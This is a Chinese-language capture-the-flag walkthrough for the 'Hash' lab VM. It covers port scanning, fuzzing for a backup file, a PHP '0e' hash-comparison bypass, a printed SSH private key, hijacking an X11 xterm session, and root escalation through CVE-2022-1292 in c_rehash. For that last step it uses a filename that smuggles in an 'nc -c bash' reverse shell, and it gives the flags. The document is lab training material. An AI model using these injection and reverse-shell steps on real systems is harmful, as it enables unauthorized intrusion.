# Hash

:::note

[Linux VM] [Tested on VirtualBox] created by || sml

⏲️ Release Date // 2021-02-05

✔️ MD5 // 7707cf5723630fe8b72cd9624594e902

☠ Root // 36

💀 User // 37

📝Notes //
Hack and Fun!

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.110
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.110
Host is up (0.00055s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 1e:fb:86:3d:cf:26:a2:a0:ae:b0:00:61:0b:41:cb:ab (RSA)
|   256 80:8e:46:7b:1d:6e:13:74:22:89:ad:91:b4:44:64:ec (ECDSA)
|_  256 71:e5:e1:4f:34:16:de:ec:b5:c4:fe:f5:0a:a2:ee:fc (ED25519)
80/tcp   open  http          nginx 1.14.2
|_http-title: LOGIN
|_http-server-header: nginx/1.14.2
3389/tcp open  ms-wbt-server xrdp
```

## web 服务

查看原始数据包

```html
┌─[randark@parrot]─[~]
└──╼ $http get http://192.168.56.110/
......
<!doctype html>
<html lang="en">
<title>LOGIN</title>

    <form class="form-signin" action="check.php" method="post">

      <input type="text" autocomplete="off" id="user" name="user" name="user" placeholder="Username" required autofocus>
      <input type="password" name="password" id="password" placeholder="Password" required>
      <input type="submit" value="Login">
    </form>
<!-- Marco, remember to delete the .bak file-->
  </body>
</html>
```

尝试爆破

```shell
┌─[randark@parrot]─[~]
└──╼ $ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.110/FUZZ.bak -t 50
......
[Status: 200, Size: 273, Words: 26, Lines: 15, Duration: 16ms]
    * FUZZ: check
```

查看数据

```php title="check.bak"
<?php
    // Login part.
    $pass = $_POST['password'];
    //marco please dont use md5, is not secure.
    //$passwordhashed = hash('md5', $pass);
    $passwordhashed = hash('sha256',$pass);
    if ($passwordhashed == '0e0001337') {
        //Your code here
    }
    else{
        //Another code here
    }
    //To finish
?>
```

由于采用了 `==` 弱比较的方式，所以可以直接采用 `0e` 绕过

相关数据可以参考 [hashes/sha256.md at master · spaze/hashes](https://github.com/spaze/hashes/blob/master/sha256.md)

成功登陆之后，即可得到

```plaintext
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxiKdFmWJiVfVYaNGov1xuh0/nrXnNsx2s6g5IoIJrmkX+9qzt2US
ZWMgrjLzAyB3wrLFysCPh4F8GU87pJkbpc0prM/8vB2WJCg5ktDQ6o0vwH219sPKUS4e9R
s2bPz7CJX5bzFDQ3B6ZUOs1itZ1t/uq38XuCxDjI8XxU6fusB3Rjz2XIombtFwo78W1pkX
VnQhzZOQ+b8UaC5lZeKatcZ0xdc0iQgiAbcRN7sXYCDMxMmo9KsxqzWjd56hLrv1nsTy2t
VBXzDRw+5JU4AJlGDRB/Upq/oKbGDCOmgNUsJPQKW4TgEAWhUa+t/ue2Bs/wFjCY7w/LkY
pK4bnY5eHQAAA8C/pv23v6b9twAAAAdzc2gtcnNhAAABAQDGIp0WZYmJV9Vho0ai/XG6HT
+etec2zHazqDkiggmuaRf72rO3ZRJlYyCuMvMDIHfCssXKwI+HgXwZTzukmRulzSmsz/y8
HZYkKDmS0NDqjS/AfbX2w8pRLh71GzZs/PsIlflvMUNDcHplQ6zWK1nW3+6rfxe4LEOMjx
fFTp+6wHdGPPZciiZu0XCjvxbWmRdWdCHNk5D5vxRoLmVl4pq1xnTF1zSJCCIBtxE3uxdg
IMzEyaj0qzGrNaN3nqEuu/WexPLa1UFfMNHD7klTgAmUYNEH9Smr+gpsYMI6aA1Swk9Apb
hOAQBaFRr63+57YGz/AWMJjvD8uRikrhudjl4dAAAAAwEAAQAAAQEAlMcLA/VMmGfu33kW
Im+DRUiPLCLVMo3HmFH6TRIuKNvbWY+4oT5w2NbdhFDXr4Jiyz0oTn3XiN3PDMY1N/yMCS
0MXSp0UeE5i3709Gx+Y5GOyNDcoSYVtm2Wa2B6ts4jxievfDIWmv5LudxeXReCR1oxQm+V
pQL/2fzc0ZifUj+/VSSIltgDKHxEfebfK0xShgXTSlUhickSapre2ArSdplM/rYvZLDWmd
iGkGD3VnAgRtloy5v32vPI3M++OCrHbLxgff4odAjawejPPHVj3beMgCrqwb/CCNKEyWKc
Jkjjt7nY/GUW4RfzM34LplezpmvrsLkTVMAb3KflDkDPFQAAAIBrP6Pnz0t8d/M+4hEb66
IkrftwqMC+c8Z0HMGURTMco7jXfoXaVP3eWCafEZ/RobZm0Ob1mnBZ574Qn8ai5VLPyJz6
5Ibe1Z6LWu6yCL/VFNyksnVARIuVjQt9pXpzbXOfn0H4ZHRBFyRhNHGjnft1PA59O30Dpw
UVz9eO3K2EqQAAAIEA4baQFa4RYnZ/YK4F6acjsAPhk88poLjDT86eCQ08wO5+d8BGuSHE
+BAqCZJuJTvvozYpZ5NFW4OEG9+T/HX2tvB6Ucc1pbQNNnB7CBp/VoLLTW+nuU3YJbgYlx
VnWRRudD6K7wjZEHJ44XzLdTy2wyeUvZw/iJRZmqQ5hxXCD1MAAACBAOC4ucZotWaq/pb5
V5RqLV8HU+DWFHAIfvqtYI5wCcZmAjGtXgLF1HY9MZ3bRPz2/m7cB44cdgCRbtmqBvnOvn
6h9AS4gr1HOJEpjgohkxBTc2Mf/dpCCdcNCX2Xy5ExPSilbS2rUHHCIU2J/yZGTths8fBR
cEjmSYvt0qFY/t7PAAAACm1hcmNvQGhhc2g=
-----END OPENSSH PRIVATE KEY-----
```

## User - marco

```shell
┌─[randark@parrot]─[/tmp]
└──╼ $nano id_rsa
┌─[randark@parrot]─[/tmp]
└──╼ $chmod 600 id_rsa
┌─[randark@parrot]─[/tmp]
└──╼ $ssh -i id_rsa marco@192.168.56.110
Linux hash 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 16 02:45:22 2024 from 192.168.56.102
marco@hash:~$ whoami
marco
```

### flag - user

```shell
marco@hash:~$ cat user.txt
hashmanready
```

### 环境探测

```shell title="ls -lh /home/maria/"
total 4.0K
-rwxr-xr-x 1 maria maria 25 Feb  5  2021 myterm.sh
```

查看文件内容

```shell
export DISPLAY=:10
xterm
```

那简单，SSH 可以转发 X11 会话连接，将 SSH 的会话通过 `-XY` 启动 X11 转发，并且在本地启动 X11 会话客户端（例如 `X410`），然后运行这个脚本

```shell
marco@hash:/home/maria$ ./myterm.sh
```

稍等片刻，应该会有两个 X11 会话窗口出现

![xterm](img/image_20240218-161803.png)

其中就有 `maria` 用户的会话

## User - maria

将 `maria` 的 xterm 会话反弹到监听机

```shell
┌─[randark@parrot]─[~]
└──╼ $pwncat-cs -lp 8888
[16:19:54] Welcome to pwncat 🐈!
[16:20:08] received connection from 192.168.56.110:43718
[16:20:09] 0.0.0.0:8888: normalizing shell path
           192.168.56.110:43718: registered new host w/ db
(local) pwncat$ back
(remote) maria@hash:/home/maria$ whoami
maria
```

然后探测环境

```shell title="sudo -l"
Matching Defaults entries for maria on hash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User maria may run the following commands on hash:
    (ALL : ALL) NOPASSWD: /usr/bin/c_rehash
```

### 尝试提权

参考：[alcaparra/CVE-2022-1292: CVE-2022-1292 OpenSSL c_rehash Vulnerability - POC](https://github.com/alcaparra/CVE-2022-1292)

```shell
(remote) maria@hash:/home/maria$ nano 
```

然后在`nano`编辑器中输入

```plaintext
-----BEGIN CERTIFICATE-----
```

然后`Ctrl`+`x`，保存文件，使用以下作为文件名

```plaintext
hey.crt`nc -c bash 192.168.56.102 6666
```

然后执行

```shell
(remote) maria@hash:/home/maria$ sudo /usr/bin/c_rehash .
```

## User - root

```shell
┌─[✗]─[randark@parrot]─[~]
└──╼ $pwncat-cs -lp 6666
[18:56:24] Welcome to pwncat 🐈!
[19:04:00] received connection from 192.168.56.110:46698
[19:04:01] 192.168.56.110:46698: registered new host w/ db
(local) pwncat$ back
(remote) root@hash:/home/maria# whoami
root
```

### flag - root

```shell
(remote) root@hash:/root# cat root.txt 
hashhater
```
